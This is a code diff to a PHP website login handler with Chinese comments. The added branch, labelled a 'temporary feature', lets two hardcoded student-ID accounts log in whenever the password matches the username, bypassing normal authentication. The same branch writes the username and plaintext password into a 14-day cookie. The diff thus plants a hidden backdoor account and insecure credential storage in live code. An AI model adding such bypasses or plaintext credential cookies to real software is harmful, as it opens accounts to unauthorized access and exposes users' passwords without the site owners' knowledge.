@@ -23,6 +23,19 @@ if ( isset( $_POST[ 'login' ] ) ) { // 如果有提交的登陆数据
         header( 'refresh:0; url=../personal/index.php' ); // 跳转至个人主页
         exit; // 退出php
     }
+    else if($username=='2016170201035' || $username=='2017060106019') // 临时功能
+        if($username==$password)
+        {
+            $_SESSION[ 'username' ] = $username; // 建立SESSION传递用户学号
+            $_SESSION[ 'islogin' ] = 1; // 确定登陆信息为已登录
+            if ( $_POST[ "R_C" ] == "yes" ) // 是否记住用户名和密码
+                setcookie("R_C", $username." ".$password, time()+1209600); // 设定14天的cookie
+            elseif( $_POST["R_C"] != "yes") // 如果没有设置记住用户名和密码
+                setcookie("R_C", '', time()-604800); // 删除cookie
+            $wrong = 'no'; // 输入账户正确
+            header( 'refresh:0; url=../personal/index.php' ); // 跳转至个人主页
+            exit; // 退出php
+        }
 }
 ?>
 
